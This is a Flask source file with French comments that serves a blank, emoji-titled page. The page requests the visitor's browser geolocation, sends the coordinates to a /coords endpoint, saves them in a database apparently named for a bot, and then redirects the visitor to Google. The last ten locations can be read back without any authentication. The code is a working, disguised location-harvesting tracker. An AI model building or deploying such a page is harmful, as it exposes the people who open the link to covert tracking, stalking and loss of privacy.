from flask import Flask, request, jsonify, render_template_string
from sqlalchemy import create_engine, Column, Integer, String, Float, DateTime
from sqlalchemy.orm import declarative_base, sessionmaker
from datetime import datetime

app = Flask(__name__)

# Base de données
engine = create_engine("sqlite:///bot_data.db", echo=False)
Base = declarative_base()
Session = sessionmaker(bind=engine)
session = Session()

class Coord(Base):
    __tablename__ = "coords"
    id = Column(Integer, primary_key=True)
    username = Column(String)
    latitude = Column(Float)
    longitude = Column(Float)
    created_at = Column(DateTime, default=datetime.utcnow)

Base.metadata.create_all(engine)

# Page HTML pour récupérer la géolocalisation
HTML_PAGE = """
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>📍</title>
</head>
<body>
<script>
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(success, error);
} else { alert("La géolocalisation n'est pas supportée."); }

async function success(pos) {
  const { latitude, longitude } = pos.coords;
  await fetch("/coords", {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({latitude,longitude})});
  window.location.href = "https://google.com";  // Redirige vers Google après envoi
}

function error(err) { alert("Erreur de localisation: " + err.message); }
</script>
</body>
</html>
"""

@app.route("/")
def index(): return render_template_string(HTML_PAGE)

@app.route("/coords", methods=["POST", "GET"])
def coords():
    if request.method == "POST":
        data = request.get_json()
        new_coord = Coord(username="Anonyme", latitude=data["latitude"], longitude=data["longitude"])
        session.add(new_coord)
        session.commit()
        return jsonify({"message": "Coordonnées enregistrées ✅"})
    coords = session.query(Coord).order_by(Coord.created_at.desc()).limit(10).all()
    return jsonify([{"username":c.username,"latitude":c.latitude,"longitude":c.longitude,"date":c.created_at.strftime("%d/%m/%Y %H:%M")} for c in coords])

if __name__ == "__main__":
    print("🌍 Serveur Flask en ligne sur http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000)
